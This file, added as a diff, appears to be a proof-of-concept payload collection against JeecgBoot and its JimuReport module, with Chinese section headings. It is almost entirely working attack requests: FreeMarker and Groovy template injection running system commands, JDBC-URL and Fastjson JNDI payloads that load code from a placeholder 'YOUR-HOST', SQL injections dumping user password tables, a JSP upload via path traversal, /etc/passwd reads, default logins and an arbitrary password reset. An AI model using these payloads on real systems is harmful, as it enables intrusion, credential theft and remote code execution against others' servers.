@@ -1,0 +1,327 @@
+一、queryFieldBySql FreeMarker SSTI (CVE-2023-4450)
+POST /jmreport/queryFieldBySql
+poc1:
+{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami\") }'"}
+poc2:
+{"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}'"}
+poc3:
+{"sql":"select '${jeecg.compute(\"=6*7\")}'"}
+
+
+二、testConnection JDBC RCE
+POST /jmreport/testConnection
+poc1:
+{"id":"1","code":"ABC","dbType":"MySQL","dbName":"383BAb7deFC825E6","dbDriver":"org.postgresql.Driver","dbUrl":"jdbc:postgresql://127.0.0.1:5432/x?socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=http://YOUR-HOST/bean.xml","dbPassword":"postgres","userName":"postgres"}
+poc2:
+{"id":"1","code":"ABC","dbType":"MySQL","dbName":"383BAb7deFC825E6","dbDriver":"org.h2.Driver","dbUrl":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {java.lang.Runtime.getRuntime().exec(b);}';CALL EXEC('id')","dbPassword":"x","userName":"x"}
+poc3:
+{"id":"1","code":"ABC","dbType":"MySQL","dbName":"383BAb7deFC825E6","dbDriver":"com.mysql.jdbc.Driver","dbUrl":"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","dbPassword":"x","userName":"x"}
+
+
+三、loadTableData FreeMarker SSTI (CVE-2023-41544)
+POST /jmreport/loadTableData
+poc1:
+{"dbSource":"","sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"whoami\")}'","tableName":"test_demo);","pageNo":1,"pageSize":10}
+poc2:
+{"dbSource":"","sql":"select version();","tableName":"test_demo);","pageNo":1,"pageSize":10}
+poc3:
+{"dbSource":"","sql":"select '<#assign v=6*7>${v}'","tableName":"test_demo);","pageNo":1,"pageSize":10}
+
+
+四、qurestSql FreeMarker SSTI
+POST /jmreport/qurestSql
+poc1:
+{"apiSelectId":"1316997232402231298","id":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"whoami\")}'"}
+poc2:
+{"apiSelectId":"1290104038414721025","id":"1' union all select 1,2,database(),version(),5,6,7 from rep_demo_gongsi where id='1"}
+
+
+五、queryTableData 任意表读取 (CVE-2022-45205)
+GET /sys/dict/queryTableData
+poc1:
+/sys/dict/queryTableData?pageSize=100&table=information_schema.tables&text=table_name&code=TABLE_SCHEMA
+poc2:
+/sys/dict/queryTableData?pageSize=100&table=sys_user&text=username&code=password
+
+
+六、qurestSql SQL 注入
+POST /jmreport/qurestSql
+poc1:
+{"apiSelectId":"1290104038414721025","id":"1' union all select 1,2,database(),version(),5,6,7 from rep_demo_gongsi where id='1"}
+poc2:
+{"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '"}
+
+
+七、getDictItemsByTable 注入 / getDictItems 未授权读取
+GET /sys/ng-alain/getDictItemsByTable
+poc1:
+/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js
+poc2:
+/sys/ng-alain/getDictItemsByTable/sys_user/username/password
+poc3:
+/sys/dict/getDictItems/sys_user,realname,username
+poc4:
+/sys/dict/getDictItems/sys_user,realname,id,1=1#
+
+
+八、jmreport/show SQL 注入
+POST /jmreport/show
+poc1:
+{"id":"961455b47c0b86dc961e90b5893bff05","apiUrl":"","params":"{\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select database())),1)) or '%%' like '\"}"}
+poc2:
+{"id":"961455b47c0b86dc961e90b5893bff05","apiUrl":"","params":"{\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(version())),1)) or '%%' like '\"}"}
+
+
+九、queryFieldBySql SQL 注入
+POST /jmreport/queryFieldBySql
+poc1:
+{"sql":"1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1"}
+poc2:
+{"sql":"select * from sys_user where 1=1 and extractvalue(1,concat(0x7e,(select version())))"}
+
+
+十、getTotalData fieldName 注入
+POST /drag/onlDragDatasetHead/getTotalData
+poc1:
+{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(0x7e,version(),0x7e)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
+poc2:
+{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(0x7e,database(),0x7e)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
+
+
+十一、sys/duplicate/check SQL 注入
+GET /sys/duplicate/check
+需 X-Access-Token
+poc1:
+/sys/duplicate/check?tableName=v3_hello&fieldName=1+and%09if(user(%20)='root@localhost',sleep(5),sleep(0))&fieldVal=1&dataId=asd
+poc2:
+/sys/duplicate/check?dataId=%272000aa&fieldName=updatexml(1%2C(select%2F**%2Fif(length(%22aaa%22)%3E5%2C1%2Csleep(5))%20union%20select%2F**%2F1)%2C1)&fieldVal=a&tableName=sys_log
+poc3:
+/sys/duplicate/check?tableName=sys_log&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(10))&fieldVal=1000&dataId=2000
+
+
+十二、jmreport 未授权文件上传
+POST /jmreport/upload
+poc1:
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4
+
+------WebKitFormBoundaryyfyhSCMs9cajzFD4
+Content-Disposition: form-data; name="file"; filename="YWv873Lw.html"
+Content-Type: text/html
+
+YLe73MwsR2==
+------WebKitFormBoundaryyfyhSCMs9cajzFD4
+Content-Disposition: form-data; name="fileName"
+
+YWv873Lw.html
+------WebKitFormBoundaryyfyhSCMs9cajzFD4
+
+Content-Disposition: form-data; name="biz"
+
+excel_online
+------WebKitFormBoundaryyfyhSCMs9cajzFD4--
+poc2:
+curl -s -X POST "http://TARGET/jmreport/upload" -F "file=@probe.txt" -F "fileName=probe.txt" -F "biz=excel_online"
+
+
+十三、commonController 任意文件上传（路径穿越绕过）
+POST /api/../commonController.do?parserXml
+poc1:
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4
+
+------WebKitFormBoundaryyfyhSCMs9cajzFD4
+Content-Disposition: form-data; name="name"
+
+YWkc.png
+------WebKitFormBoundaryyfyhSCMs9cajzFD4
+Content-Disposition: form-data; name="documentTitle"
+
+blank
+------WebKitFormBoundaryyfyhSCMs9cajzFD4
+Content-Disposition: form-data; name="file"; filename="MYws72.jsp"
+Content-Type: image/png
+
+<% out.println("111");%>
+------WebKitFormBoundaryyfyhSCMs9cajzFD4--
+poc2:
+/api/../commonController.do?parserXml
+
+
+十四、sys/common/upload 文件上传
+POST /sys/common/upload
+poc1:
+curl -s -X POST "http://TARGET/sys/common/upload" -F "file=@probe.txt"
+poc2:
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4
+
+------WebKitFormBoundaryyfyhSCMs9cajzFD4
+Content-Disposition: form-data; name="file"; filename="probe.txt"
+Content-Type: text/plain
+
+jscan-probe
+------WebKitFormBoundaryyfyhSCMs9cajzFD4--
+
+
+十五、jeecgFormDemoController SSRF / JNDI (4.0 及以前)
+POST /api/../jeecgFormDemoController.do?interfaceTest=
+poc1:
+serverUrl=http://YOUR-HOST/jeecg.txt&requestBody=1&requestMethod=GET
+poc2:
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://YOUR-HOST:1389/exp","autoCommit":true}}
+
+
+十六、imController 任意文件下载
+GET /chat/imController/showOrDownByurl.do
+poc1:
+/chat/imController/showOrDownByurl.do?fileUrl=../../../../../../etc/passwd
+poc2:
+/chat/imController/showOrDownByurl.do?fileUrl=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+poc3:
+/chat/imController/showOrDownByurl.do?fileUrl=..\..\..\..\..\..\windows\win.ini
+
+
+十七、P3 Biz Chat 任意文件读取
+GET /sys/p3/chat/download
+poc1:
+/sys/p3/chat/download?fileName=../../../../../../etc/passwd
+poc2:
+/sys/p3/chat/download?fileName=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+poc3:
+/sys/p3/chat/download?fileName=..\..\..\..\..\..\windows\win.ini
+
+
+十八、jmreport save/show AviatorScript 表达式注入
+POST /jmreport/save + GET /jmreport/show
+poc1:
+POST /jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123
+{"loopBlockList":[],"area":false,"printElWidth":718,"excel_config_id":"980882669965455363","printElHeight":1047,"rows":{"4":{"cells":{"4":{"text":"=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('test', Base64Utils.decodeFromString('BASE64_BYTES'), ClassLoader.getSystemClassLoader());)","style":0}},"height":25},"len":96},"dbexps":[],"toolPrintSizeObj":{"printType":"A4","widthPx":718,"heightPx":1047},"dicts":[],"freeze":"A1","dataRectWidth":701,"background":false,"name":"sheet1","autofilter":{},"styles":[{"align":"center"}],"validations":[],"cols":{"4":{"width":95},"len":50},"merges":["E4:F4","B4:B5","C4:C5","D4:D5","G4:G5","H4:H5","I4:I5","D1:G1","H3:I3"]}
+GET /jmreport/show?id=980882669965455363
+poc2:
+{"loopBlockList":[],"area":false,"printElWidth":718,"excel_config_id":"9900099112233445566","printElHeight":1047,"rows":{"4":{"cells":{"4":{"text":"=6*7","style":0}},"height":25},"len":96},"name":"sheet1","styles":[{"align":"center"}]}
+GET /jmreport/show?id=9900099112233445566
+
+
+十九、Fastjson JNDI 反序列化
+POST /api/../jeecgFormDemoController.do?interfaceTest=
+poc1:
+{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
+poc2:
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://YOUR-HOST:1389/exp","autoCommit":true}
+
+
+二十、querySysUser 信息泄露
+GET /sys/user/querySysUser
+poc1:
+/sys/user/querySysUser?username=admin
+poc2:
+/jeecg-boot/sys/user/querySysUser?username=admin
+
+
+二十一、checkOnlyUser 账号枚举
+GET /sys/user/checkOnlyUser
+poc1:
+/sys/user/checkOnlyUser?username=admin
+poc2:
+/jeecg-boot/sys/user/checkOnlyUser?username=admin
+
+
+二十二、actuator httptrace 信息泄露
+GET /actuator/httptrace
+poc1:
+/actuator/httptrace
+poc2:
+/actuator/httptrace/
+poc3:
+/%61%63%74%75%61%74%6f%72/httptrace/
+
+
+二十三、数据库账号密码泄露
+GET /sys/dataSource/list
+poc1:
+/sys/dataSource/list
+poc2:
+/jeecg-boot/sys/dataSource/list
+poc3:
+/jmreport/datasource/list?pageSize=10&pageNo=1
+
+
+二十四、默认口令
+POST /sys/login
+poc1:
+{"username":"admin","password":"123456","captcha":"","checkKey":""}
+poc2:
+{"username":"jeecg","password":"123456","captcha":"","checkKey":""}
+poc3:
+{"username":"admin","password":"admin","captcha":"","checkKey":""}
+
+
+二十五、passwordChange 任意用户密码重置
+GET /sys/user/passwordChange
+poc1:
+/sys/user/passwordChange?username=jeecg&password=YioVke@1743&smscode=&phone=
+poc2:
+/sys/user/passwordChange?username=admin&password=admin&smscode=&phone=
+
+
+二十六、online/cgform fileTree 目录遍历
+GET /online/cgform/head/fileTree
+poc1:
+/online/cgform/head/fileTree?_t=1632524014&parentPath=/
+poc2:
+/jeecg-boot/online/cgform/head/fileTree?_t=1632524014&parentPath=/
+
+
+二十七、sys/category/childList column 参数 SQL 注入
+GET /sys/category/childList
+poc1:
+/sys/category/childList?column=(select/**/sleep(3)/**/union/**/select/**/1)&order=desc&field=id%2C%2Cname%2Ccode%2Caction&pageNo=1&pageSize=1000&_t=1748504599
+poc2:
+/sys/category/childList?column=(select/**/sleep(0)/**/union/**/select/**/1)&order=desc&field=id%2C%2Cname%2Ccode%2Caction&pageNo=1&pageSize=1000&_t=1748504599
+
+
+二十八、online/cgreport/head/parseSql SQL 注入
+GET /online/cgreport/head/parseSql
+poc1:
+/online/cgreport/head/parseSql?sql=select%20schema_name%20from%20(information_schema.schemata)
+poc2:
+/online/cgreport/head/parseSql?sql=select%20username,password%20from%20sys_user
+
+
+二十九、sysMessageTemplate/sendMsg FreeMarker 模板注入
+POST /sys/message/sysMessageTemplate/add
+需 X-Access-Token
+poc1:
+{"templateType":"1","templateCode":"8","templateName":"test","templateContent":"${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}"}
+poc2:
+{"templateCode":"8","testData":"{}","receiver":"","msgType":"1"}
+
+
+三十、sys/common/uploadImgByHttp SSRF
+POST /sys/common/uploadImgByHttp
+poc1:
+{"fileUrl":"http://www.baidu.com/","filename":"temp.txt","bizPath":"temp_files"}
+poc2:
+{"fileUrl":"http://127.0.0.1:8080/","filename":"temp.txt","bizPath":"temp_files"}
+
+
+三十一、jmreport auto/export 未授权导出 (CVE-2026-58375)
+POST /jmreport/auto/export
+poc1:
+{"reportParams":[{"id":"1172036762832240640","exportType":"excel"}]}
+poc2:
+{"reportParams":[{"id":"1338744112815411200","params":{"x":"=use groovy.util.Eval; Eval.me('throw new RuntimeException(\"id\".execute().text)')"},"exportType":"pdf"}]}
+
+
+三十二、jmreport 报表列表未授权枚举 (CVE-2026-75479)
+GET /jmreport/query/report/folder/template
+poc1:
+/jmreport/query/report/folder/template?name=&pageNo=1&pageSize=100
+poc2:
+/jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=5
+
+
+三十三、jmreport dict/list 未授权
+GET /jmreport/dict/list
+poc1:
+/jmreport/dict/list?pageSize=200&pageNo=1
+poc2:
+/jeecg-boot/jmreport/dict/list?pageSize=200&pageNo=1
